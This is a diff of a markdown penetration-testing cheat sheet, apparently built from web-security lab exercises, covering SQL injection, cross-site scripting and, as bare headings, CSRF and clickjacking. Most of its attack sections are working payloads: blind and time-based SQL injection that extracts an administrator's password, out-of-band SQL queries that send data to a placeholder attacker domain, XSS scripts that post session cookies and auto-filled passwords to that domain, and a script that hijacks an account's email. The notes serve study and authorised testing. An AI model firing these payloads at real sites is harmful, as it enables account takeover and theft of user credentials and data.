@@ -1,25 +1,42 @@
 # Web Knowledge 
 ## SQL injection
+
 A SQL injection (SQLi) is a type of security exploit in which the attacker adds Structured Query Language (SQL) code to a Web form input box in order to gain access to unauthorized resources or make changes to sensitive data. An SQL query is a request for some action to be performed on a database. When executed correctly, a SQL injection can expose intellectual property, the personal information of customers, administrative credentials or private business details.
 
 #### SQLi Basics
+
 Here will be some basics informations to get when you have a successfull injection
 
 - SQL injection attack, querying the database type and version on Oracle
+
 	- Depending on the DB you can get the version as follow:
 		- Microsoft, MySQL
-		   `SELECT @@version`
+		  ```sql
+		  SELECT @@version
+		  ```
+		  
 		- Oracle
-		   `SELECT * FROM v$version`
+		    ```sql
+			SELECT * FROM v$version`
+			```
 		- PostgreSQL
-			`SELECT version()`
+			```sql
+			SELECT version()
+			```
+			
 - SQL injection attack, listing the database contents 
+
 	- Non-Oracle DB 
-		`select * from information\_schema.tables`
+		```sql
+		select * from information\_schema.tables
+		```
 	- Oracle DB
-		`select * from all_tables`
+		```sql
+		select * from all_tables
+		```
 
 #### Union SQL attack 
+
 These attacks are perform to extract data using the same amount of row than the initial result could display. For this attack, working conditions are:
 -   The individual queries must return the same number of columns.
 -   The data types in each column must be compatible between the individual queries
@@ -27,51 +44,106 @@ These attacks are perform to extract data using the same amount of row than the 
 You can have those following examples : 
 
 - Determining the number of columns returned by the query
-	- ```' union select NULL-- ```
-	    *increasing number of NULL value until values are actually return*
-	- ```' order by 1-- ```
-		*increasing the int value until an error occured*
+	 ```sql 	
+	' union select NULL-- 
+	 ``` 
+	 *increasing number of NULL value until values are actually return*
+	```sql
+	' order by 1-- 
+	```
+	*increasing the int value until an error occured*
+		
+		
 - Finding a column containing text
-	- ``` union select 'a', NULL, NULL, ...--```
-		*Add as many null as you need to match the number of columns*
+	```sql
+	union select 'a', NULL, NULL, ...--
+	```
+	*Add as many null as you need to match the number of columns*
+		
+		
 - Retrieving data from other tables
-	- ``` union select CHAMP1, CHAMP2, .... from TABLE_NAME--```
-	    *Again add as many null value as needed* 
+	```sql
+	union select CHAMP1, CHAMP2, .... from TABLE_NAME--
+	```
+	 *Again add as many null value as needed* 
+		
+		
 - Retrieving multiple values in a single column
-	- ``` union select CHAMP1 || 'SEPERATOR' || CHAMP2 .... from TABLE_NAME--```
-		*Very usefull when you only have the capacity to extract data from a uniq column*
+	```sql 
+	union select CHAMP1 || 'SEPERATOR' || CHAMP2 .... from TABLE_NAME--
+	```
+	*Very usefull when you only have the capacity to extract data from a uniq column*
+		
 		
 #### Blind SQL attack 
 
 - Conditional responses
+
 	The goal here is to exfiltrate char by char fields using for exemple a query looking like this one : 
-	* `' and (select substring(password,1,1) from users where username='administrator')='a`
-	
+	```sql
+	' and (select substring(password,1,1) from users where username='administrator')='a`
+	```
 - Conditional errors
+
 	The goal here is to check errors based on a True query and on a false one. Here is an example:
-	* `' and (select case when (1=2) then 1/0 else 'a' end)='a` => True statement
-	* `' and (select case when (1=1) then 1/0 else 'a' end)='a` => False statement
+	 ```sql
+	 ' and (select case when (1=2) then 1/0 else 'a' end)='a
+	 ``` 
+	 => True statement
+	
+	
+	```sql
+	' and (select case when (1=1) then 1/0 else 'a' end)='a
+	``` 
+	=> False statement
+	
 	
 - Time delays
+
     This one is the favorite of everyone to quickly check for blind SQL. The goal is to insert a sleep function (once or twice to confirm it) and check if there is any latence in the anwser given by the server. If there is one, and if this latence is proportionate to your sleep value, then you know that you've got SQLi. Examples : 
-	* `';sleep(10)--`
-	* `'; if (1=1) waitfor delay '0:0:5'--`
+	
+	```sql
+	';sleep(10)--
+	```
+	
+	```sql
+	'; if (1=1) waitfor delay '0:0:5'--
+	```
+	
 	
 - Time delays and information retrieval
+
 	Using the techique right above, we can exfiltrate data based on the time the query take to give a result. We will stick with conditional tested char by char. Here is an example : 
-	* `'; if (select count(username) from users where username = 'administrator' and substring(password, 1, 1) > 'm') = 1 waitfor delay '0:0:5'--`
+	```sql
+	'; if (select count(username) from users where username = 'administrator' and substring(password, 1, 1) > 'm') = 1 waitfor delay '0:0:5'--
+	```
+	
 	
 - Out-of-band (OAST)
+
    This type of SQLi is perform against asynchronous system. The goal here is to trigger out-of-band network. We usually use DNS protocol because that's simplier and available on any system. To exfiltrate data we will use conditionals techniques again and more precisely a time delays equivalent. Basicly we will redirect to our controlled domain on True or False condition. For example we can perform those :
    * For Microsoft SQL Server
       		
-		* `'; exec master..xp\_dirtree '//MYDOMAIN/a'--` *basic test*
+		```sql
+		'; exec master..xp\_dirtree '//MYDOMAIN/a'--
+		```
+		*basic test*
 		
-		* `declare @q varchar(1024); set @q = 'master..xp\_dirtree '\\\\' + substring(convert(varchar(max), convert(varbinary(max), user\_name()), 1),1,60) + '.MYDOMAIN\\foo'; exec(@q)` *return data on subdomain param*
+		
+		```sql
+		declare @q varchar(1024); set @q = 'master..xp\_dirtree '\\\\' + substring(convert(varchar(max), convert(varbinary(max), user\_name()), 1),1,60) + '.MYDOMAIN\\foo'; exec(@q)
+		```
+		*return data on subdomain param*
+		
+		
    *  MYSQL
-	   * Check for the LOAD\_FILE, sys\_eval, http\_get, .. functions
+	   			=> Check for the LOAD\_FILE, sys\_eval, http\_get, .. functions
+	   
 	* ORACLE
-		* `select dbms_ldap.init((select version from v$instance)||'.'||(select user from 		dual)||'.'||(select name from 	v$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) from 	dual;`
+		```sql
+		select dbms_ldap.init((select version from v$instance)||'.'||(select user from 		dual)||'.'||(select name from 	v$database)||'.'||'MYDOMAIN',80) from 	dual;
+		```
+
 
 - SQL injection vulnerability allowing login bypass
 	* Very simple : `username'--`
@@ -92,36 +164,147 @@ In order to prevent a SQL injection attack from occurring in the first place, de
 
 
 ## Cross-site scripting
-- Reflected XSS into HTML context with nothing encoded
-- Reflected XSS into HTML context with most tags and attributes blocked
-- Reflected XSS into HTML context with all tags blocked except custom ones
-- Reflected XSS with event handlers and href attributes blocked
-- Reflected XSS with some SVG markup allowed
-- Reflected XSS into attribute with angle brackets HTML-encoded
-- Stored XSS into anchor href attribute with double quotes HTML-encoded
-- Reflected XSS in canonical link tag
-- Reflected XSS into a JavaScript string with single quote and backslash escaped
-- Reflected XSS into a JavaScript string with angle brackets HTML encoded
-- Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
-- Reflected XSS in a JavaScript URL with some characters blocked
-- Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
-- Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
-- Reflected XSS with AngularJS sandbox escape without strings
-- Reflected XSS with AngularJS sandbox escape and CSP
-- Stored XSS into HTML context with nothing encoded
-- DOM XSS in document.write sink using source location.search
-- DOM XSS in document.write sink using source location.search inside a select element
-- DOM XSS in innerHTML sink using source location.search
-- DOM XSS in jQuery anchor href attribute sink using location.search source
-- DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
-- Reflected DOM XSS
-- Stored DOM XSS
+
+Cross-site scripting is used to inject malicious javascript code to user browser. This attack can lead to a total control of the application in use. More details and specific stuff can be found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
+
+#### Basics
+
+
 - Exploiting cross-site scripting to steal cookies
+
+	This part represent the principal use of XSS. Web apps usually use cookies to save and remember sessions. In that way, this attack get the cookie in question and send it back to your own domain so you can easily capture it. 
+	
+	There is comon security system used to avoid this attack:
+	-   The victim might not be logged in.
+	-   Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
+	-   Sessions might be locked to additional factors like the user's IP address.
+	-   The session might time out before you're able to hijack it.
+	
+	Here is an example of that type of XSS:
+	```javascript 
+	<script> fetch('https://MYDOMAIN', {  method: 'POST',  mode: 'no-cors',  body:document.cookie  });  </script>
+	```
+
+
 - Exploiting cross-site scripting to capture passwords
+	
+	This technique can be use because of stupid password managers and auto-fill option. Basicly the only thing you have to do is to inject an option in the input label to read data when they are enter. Here is an example : 
+	
+	```html
+	<input name=username id=username>  
+	<input type=password name=password onchange="if(this.value.length)fetch('https://MYDOMAIN',{  
+	method:'POST',  
+	mode: 'no-cors',  
+	body:username.value+':'+this.value  
+	});">
+	```
+
+
 - Exploiting XSS to perform CSRF
-- Reflected XSS protected by CSP, with dangling markup attack
-- Reflected XSS protected by very strict CSP, with dangling markup attack
-- Reflected XSS protected by CSP, with CSP bypass
+
+	XSS can also be used to perform CSRF (more details in the next section). Here is an example payload working with token protection enable: 
+	
+	```javascript
+	<script>  
+	var req = new XMLHttpRequest();  
+	req.onload = handleResponse;  
+	req.open('get','/my-account',true);  
+	req.send();  
+	function handleResponse() {  
+	 var token = this.responseText.match(/name="csrf" value="(\\w+)"/)\[1\];  
+	 var changeReq = new XMLHttpRequest();  
+	 changeReq.open('post', '/my-account/change-email', true);  
+	 changeReq.send('csrf='+token+'&email=test@test.com')  
+	};  
+	</script>
+	```
+
+
+#### Reflected XSS 
+
+Reflected XSS is the simplest variety of cross-site scripting. The application receive data in an HTTP request and includes that data within the immediate response in an unsafe way. Nothing is stored in the webapp and the trigger only works when the user click on the link or whatever with this particular payload include. Here are some examples : 
+
+- HTML context with nothing encoded
+
+	 ```javascript
+	 <script>alert(1)</script>
+	 ```
+ 
+ 
+- HTML context with most tags and attributes blocked
+
+	```html 
+	<iframe src="https://WEBSITE/?search="><body onresize=alert(document.cookie)>" onload=this.style.width='100px'>
+	```
+
+
+- HTML context with all tags blocked except custom ones
+
+	```javascript
+	<script>  
+	location = 'https://WEBSITE/?search=<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x';  
+	</script>
+	```
+
+
+- Event handlers and href attributes blocked
+
+	```javascript
+	https://WEBSITE/?search=<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click me</text></a>
+	```
+
+- Some SVG markup allowed
+
+	```javascript
+	https://WEBSITE/?search="><svg><animatetransform onbegin=alert(1)>
+	```
+
+
+- Reflected XSS with AngularJS sandbox escape without strings
+
+	```javascript
+	https://your-lab-id.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d\[\].join;\[1\]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+	```
+	
+	
+- Reflected XSS with AngularJS sandbox escape and CSP
+
+	```html
+	<script>  
+	location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';  
+	</script>
+	```
+	
+
+#### Stored XSS 
+Stored XSS is an injection in the actual page by any way (message, template injection, input, ...). Here are some examples: 
+
+- Stored XSS into anchor href attribute with double quotes HTML-encoded
+
+	 ```javascript
+	 javascript:alert('XSS')
+	 ```
+	 
+	 
+- Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
+
+	```javascript
+	&apos;-alert(1)-&apos;
+	```
+	
+
+#### DOM XSS 
+
+DOM Based XSS is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. That is, the page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.
+
+As the vulnaribility is app specific, there will be no example and you will have to use your brain. 
+
+
+#### Escape CSP
+
+CSP or 'Content Security Policy ' is a protection to XSS, clickjacking, code injection and more. CSP can be found on the server answer. You can use a [checker](https://csp-evaluator.withgoogle.com/) to dig in what you have in front of you. As the topic is large again here is a [link](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass) to understand what the checker gave you 
+
+
 ## Cross-site request forgery (CSRF)
 - CSRF vulnerability with no defenses
 - CSRF where token validation depends on request method
@@ -131,6 +314,8 @@ In order to prevent a SQL injection attack from occurring in the first place, de
 - CSRF where token is duplicated in cookie
 - CSRF where Referer validation depends on header being present
 - CSRF with broken Referer validation
+
+
 ## Clickjacking
 - Basic clickjacking with CSRF token protection
 - Clickjacking with form input data prefilled from a URL parameter
